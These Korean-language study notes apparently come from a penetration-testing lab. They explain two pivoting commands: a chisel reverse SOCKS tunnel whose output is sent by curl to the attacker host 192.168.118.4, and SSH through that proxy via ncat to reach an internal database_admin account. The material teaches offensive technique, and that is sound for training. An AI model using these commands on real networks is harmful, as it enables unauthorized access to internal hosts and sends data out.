```bash
/tmp/chisel client 192.168.118.4:8080 R:socks &> /tmp/output; curl --data @/tmp/output http://192.168.118.4:8080/
```
- `client <서버주소:포트>`: 지정된 서버에 클라이언트 모드로 접속
- `R:socks`: 서버 측에서 리버스 SOCKS 프록시를 생성  
  (즉, 서버에서 접속할 수 있는 SOCKS 포트가 열림)
- `&> /tmp/output`: 표준 출력과 표준 에러를 `/tmp/output` 파일로 리다이렉트
- `curl --data @/tmp/output <url>`: 실행 결과 로그를 서버(192.168.118.4:8080)로 전송



```bash
ssh -o ProxyCommand='ncat --proxy-type socks5 --proxy 127.0.0.1:1080 %h %p' database_admin@10.4.50.215
```
- `ssh -o ProxyCommand=...`: SSH 접속 시 프록시 명령어 지정
- `ncat`: netcat의 확장 버전으로 다양한 프록시 지원
- `--proxy-type socks5`: SOCKS5 프로토콜을 사용
- `--proxy 127.0.0.1:1080`: 로컬에서 실행 중인 SOCKS 프록시(Chisel을 통해 생성된 것)
- `%h %p`: SSH가 접속하려는 원격 호스트와 포트로 치환됨
- `database_admin@10.4.50.215`: 최종적으로 접속할 SSH 서버 계정 및 주소
---
